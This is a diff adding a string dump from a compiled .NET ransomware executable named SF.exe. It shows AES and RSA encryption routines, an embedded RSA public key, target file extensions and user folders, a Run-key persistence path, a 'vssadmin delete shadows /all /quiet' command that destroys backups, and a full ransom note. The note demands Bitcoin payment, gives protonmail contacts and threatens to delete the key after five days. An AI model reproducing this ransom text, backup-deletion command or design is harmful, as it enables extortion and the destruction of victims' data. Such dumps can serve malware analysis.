@@ -1,0 +1,522 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+_:sY
+v4.0.30319
+#Strings
+label10
+label11
+List`1
+label1
+email1
+button1
+groupBox1
+richTextBox1
+Microsoft.Win32
+label2
+email2
+linkLabel3
+label3
+ToInt64
+label4
+label5
+label6
+label7
+Size2048
+get_UTF8
+label8
+label9
+<Module>
+PROCESS_SET_QUOTA
+WRITE_DAC
+PROCESS_CREATE_THREAD
+PROCESS_VM_READ
+STANDARD_RIGHTS_REQUIRED
+PROCESS_DUP_HANDLE
+PROCESS_SUSPEND_RESUME
+PROCESS_TERMINATE
+DELETE
+PROCESS_VM_WRITE
+SYNCHRONIZE
+get_ASCII
+READ_CONTROL
+PROCESS_QUERY_LIMITED_INFORMATION
+PROCESS_SET_INFORMATION
+PROCESS_QUERY_INFORMATION
+PROCESS_VM_OPERATION
+System.IO
+WRITE_OWNER
+PROCESS_ALL_ACCESS
+PROCESS_CREATE_PROCESS
+value__
+get_ProgramData
+mscorlib
+System.Collections.Generic
+Microsoft.VisualBasic
+Form1_Load
+add_Load
+get_Red
+lpnLengthNeeded
+RijndaelManaged
+richTextBox1_TextChanged
+add_TextChanged
+link1_LinkClicked
+email1_LinkClicked
+email2_LinkClicked
+link3_LinkClicked
+linkLabel3_LinkClicked
+add_LinkClicked
+set_LinkVisited
+Synchronized
+txtpid
+<ProgramData>k__BackingField
+<Message>k__BackingField
+<Folder>k__BackingField
+<Files>k__BackingField
+<Key>k__BackingField
+Append
+Clipboard
+GenericAce
+CommonAce
+InsertAce
+defaultInstance
+set_Mode
+set_AutoScaleMode
+CipherMode
+get_Message
+IDisposable
+RuntimeTypeHandle
+GetTypeFromHandle
+processHandle
+SearchFile
+UserProfile
+set_BorderStyle
+set_FormBorderStyle
+FontStyle
+set_WindowStyle
+ProcessWindowStyle
+set_Name
+get_ProductName
+ManagementScope
+WellKnownSidType
+get_Culture
+set_Culture
+resourceCulture
+ButtonBase
+ApplicationSettingsBase
+TextBoxBase
+Dispose
+DebuggerBrowsableState
+EditorBrowsableState
+get_White
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+DebuggerBrowsableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+FlagsAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+set_UseShellExecute
+SetValue
+SF.exe
+set_Size
+set_AutoSize
+set_ClientSize
+maxSize
+Encoding
+System.Runtime.Versioning
+ToBase64String
+FromXmlString
+ToString
+GetString
+disposing
+System.Drawing
+ComputeHash
+get_ExecutablePath
+GetFolderPath
+nLength
+get_BinaryLength
+get_Black
+label1_Click
+button1_Click
+label4_Click
+add_Click
+TransformFinalBlock
+SearchDisk
+SystemDisk
+System.Security.Principal
+RawAcl
+get_DiscretionaryAcl
+LinkLabel
+System.ComponentModel
+advapi32.dll
+kernel32.dll
+ContainerControl
+System.Security.AccessControl
+Program
+get_Item
+System
+SymmetricAlgorithm
+AsymmetricAlgorithm
+HashAlgorithm
+GetBinaryForm
+ICryptoTransform
+resourceMan
+set_Icon
+set_ShowIcon
+ValidExtension
+Application
+set_Location
+securityInformation
+System.Configuration
+System.Globalization
+Interaction
+System.Reflection
+ControlCollection
+ManagementObjectCollection
+set_StartPosition
+FormStartPosition
+SearchOption
+Win32Exception
+Encryption
+Environ
+Button
+CultureInfo
+set_StartInfo
+ProcessStartInfo
+ToolTip
+set_TabStop
+set_PersistKeyInCsp
+SetStartup
+set_ShowInTaskbar
+MD5CryptoServiceProvider
+RSACryptoServiceProvider
+RNGCryptoServiceProvider
+StringBuilder
+get_Folder
+set_Folder
+SearchFolder
+SpecialFolder
+sender
+get_ResourceManager
+ComponentResourceManager
+ManagementObjectSearcher
+AceQualifier
+SecurityIdentifier
+LinkLabelLinkClickedEventHandler
+System.CodeDom.Compiler
+IContainer
+CurrentUser
+set_ForeColor
+set_BackColor
+set_UseVisualStyleBackColor
+set_LinkColor
+ManagementObjectEnumerator
+GetEnumerator
+RandomNumberGenerator
+KeyGenerator
+.cctor
+GenericSecurityDescriptor
+pSecurityDescriptor
+GetProcessSecurityDescriptor
+SetProcessSecurityDescriptor
+RawSecurityDescriptor
+CreateEncryptor
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+SF.link2.resources
+SF.Properties.Resources.resources
+DebuggingModes
+GetDirectories
+SF.Properties
+get_Files
+set_Files
+GetFiles
+EnableVisualStyles
+ReadAllBytes
+WriteAllBytes
+GetNonZeroBytes
+GetBytes
+GetLogicalDrives
+KeySizes
+AceFlags
+Settings
+LinkLabelLinkClickedEventArgs
+get_Controls
+System.Windows.Forms
+set_AutoScaleDimensions
+set_ScrollBars
+RichTextBoxScrollBars
+SystemColors
+GetCurrentProcess
+ProcessAccessRights
+components
+Concat
+ManagementBaseObject
+GetObject
+ManagementObject
+GraphicsUnit
+get_Default
+SetCompatibleTextRenderingDefault
+System.Management
+Environment
+InitializeComponent
+get_Current
+set_Font
+GetPathRoot
+RunEncrypt
+AesEncrypt
+Convert
+set_TopMost
+SuspendLayout
+ResumeLayout
+PerformLayout
+set_RedirectStandardOutput
+MoveNext
+System.Text
+get_Text
+set_Text
+WriteAllText
+SetText
+get_MenuText
+get_WindowText
+set_CreateNoWindow
+set_TabIndex
+set_MinimizeBox
+set_MaximizeBox
+GroupBox
+RichTextBox
+ToCharArray
+get_Key
+set_Key
+OpenSubKey
+publicKey
+GetUniqueKey
+RegistryKey
+System.Security.Cryptography
+get_Assembly
+set_ReadOnly
+DeleteShadowCopy
+ObjectQuery
+GetPhysicalMemory
+MyMusicDirectory
+PersonalDirectory
+DesktopDirectory
+MyDocumentspDirectory
+MyComputerDirectory
+DownloadsDirectory
+PicturesDirectory
+FavoritesDirectory
+VideosDirectory
+DocumentsDirectory
+DesktopDirectoryDirectory
+HistoryDirectory
+Registry
+op_Inequality
+GetKernelObjectSecurity
+SetKernelObjectSecurity
+WrapNonExceptionThrows
+$282b8d86-f33f-441e-8bb5-95903351be39
+1.0.0.0
+.NETFramework,Version=v4.0
+FrameworkDisplayName
+.NET Framework 4
+3System.Resources.Tools.StronglyTypedResourceBuilder
+16.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+16.6.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Icon
+IconData
+IconSize
+System.Drawing.Size
+System.Drawing.Size
+height
+Apart From Paying Any Other Words You Use In Email = Blocked From Us  So .. Do Like Smart Man
+(( After Read This Note : You Only Have 5 Days To Back Your Files , Then You Cant Back ( Beacuse You Late Time End ) We Will Delete Your Decrypt Key ))
+We are Professionals So No Antivirus Or Software Will Help You
+It Only Destroys Your Information
+So ... Don't Act like a Fool Only We Can Save Your Job And Information
+To Prove That We Can Only Get Your information Back : You Can Send Us A One Locked File And We Will Decrypt It
+The File Should Not Important Dont .... Send .Jpg .Png .Txt Beacuse Its Only For Prove
+NOTE :
+- My mother is sick
+- I have no money to open for God's Please
+- Give me the key first, then I'll Pay
+- Half Open information I Pay Half
+(( We Don't Care All Up Words ))
+No Money ! No Decryption 
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+C:\Users\mlios\Desktop\Zero\SF\obj\Debug\SF.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+<RSAKeyValue><Modulus>vzOdwKaw5L0+mWIMdNE39TBiGzmOVNOzRnmJSt7/Oev/Ixe/jM2y1Luw4+qdpfJrLXHdGc7FvJ0+/V0nmAlCkPdnbYsIICE8Pr6r2ArfomdcmzTszR0Jq6KFmos0E5KxdjeeTYsZGBCaFUKoIL8NtiHej7F0MN2gS1JcGiSLN2wciVWlUvcV7tGeLwXbopVnMosCjFPMI811kv1krrPbRWe+t/giKcJ6uRaNdqTUq07HZkTFcyIXjIyj4WgtKXvsezDATNtoqMxLDL/wwwfq+lmWY2j1XfyOhu7y5kMqsJ5qsTVkPwtXska23ziRSIRB260FoRQR2vtqXSEIp0mjiQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
+\ReadME-Decrypt.txt
+ Your Personal ID: 
+D:\ReadME-Decrypt.txt
+C:\ReadME-Decrypt.txt
+E:\ReadME-Decrypt.txt
+F:\ReadME-Decrypt.txt
+G:\ReadME-Decrypt.txt
+H:\ReadME-Decrypt.txt
+I:\ReadME-Decrypt.txt
+J:\ReadME-Decrypt.txt
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+SELECT Capacity FROM Win32_PhysicalMemory
+Capacity
+https://www.investopedia.com/tech/how-to-buy-bitcoin
+https://localbitcoins.com
+https://paxful.com
+mailto:MREncptor@protonmail.com
+Consolas
+label2
+All your data has been locked us with algoritm : 
+Microsoft Sans Serif
+email1
+ellenfabiana01@protonmail.com
+label5
+All your information is locked With Strong Randsomware
+If You Want To Get Your Information Back Fast And Easy Like Never Happend , You Have To Pay
+((( We only Accept Bitcoin )))
+label6
+You Dont Know About Bitcoin !? :
+linkLabel3
+label7
+How Can i Buy Bitcoin To Any Country :
+groupBox1
+Cost and Your Personal ID for Decrypt
+button1
+Copy Personal ID
+txtpid
+label4
+Personal ID : 
+label3
+>>>>>>>>>>>> Cost For Your All Data Decrypt : $300 <<<<<<<<<<<<<<<<<<
+label8
+(( Send Email Us Only You Want Pay  :
+email2
+label9
+richTextBox1
+richTextBox1.Text
+Times New Roman
+label1
+You Are Crypted !!!
+label10
+RSA 4096 , AES 256 , Blowfish , Ascii85 , HEX , UU
+label11
+You want to return? Contact to: 
+$this.Icon
+All your data has been locked us. You want to return? Contact to: MREncptor@protonmail.com
+ All your information is locked With Strong Randsomware
+If You Want To Get Your Information Back Fast And Easy Like Never Happend , You Have To Pay
+((( We only Accept Bitcoin )))
+You Dont Know About Bitcoin !? :
+https://www.investopedia.com/tech/how-to-buy-bitcoin/
+How Can i Buy Bitcoin To Any Country :
+https://localbitcoins.com
+https://paxful.com/
+>>>>>>>>>>>> Cost For Your All Data Decrypt : $1000  <<<<<<<<<<<<<<<<<<
+(( Send Email Us Only You Want Pay : MREncptor@protonmail.com ))
+Apart From Paying Any Other Words You Use In Email = Blocked From Us  So .. Do Like Smart Man
+(( After Read This Note : You Only Have 5 Days To Back Your Files , Then You Cant Back ( Beacuse You Late Time End ) We Will Delete Your Decrypt Key ))
+We are Professionals So No Antivirus Or Software Will Help You
+It Only Destroys Your Information
+So ... Don't Act like a Fool Only We Can Save Your Job And Information
+To Prove That We Can Only Get Your information Back : You Can Send Us A One Locked File And We Will Decrypt It
+The File Should Not Important Dont .... Send .Jpg .Png .Txt Beacuse Its Only For Prove
+NOTE :
+- My mother is sick
+- I have no money to open for God's Please
+- Give me the key first, then I'll Pay
+- Half Open information I Pay Half
+(( We Don't Care All Up Words ))
+No Money ! No Decryption 
+\Users\
+.3tp2PDRJuaNSGk1c
+\ProgramData
+USERPROFILE
+\Downloads
+\Documents
+\Pictures
+\Videos
+\Music
+.plist
+.backup
+.sqlite3
+.sqlitedb
+.accdb
+.class
+.strings
+.swidtag
+.resources
+.sqlite
+.version
+.manifest
+.config
+.setup
+.netmodule
+.combo
+.ASHBAK
+.BACKUPDB
+.dvtel
+.BLEND1
+.BLEND2
+.BOOKEXPORT
+.CENON~
+cmd.exe
+/c vssadmin.exe delete shadows /all /quiet
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+SF.Properties.Resources
+$this.Icon
+richTextBox1.Text
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+FileVersion
+1.0.0.0
+InternalName
+SF.exe
+LegalCopyright
+LegalTrademarks
+OriginalFilename
+SF.exe
+ProductName
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
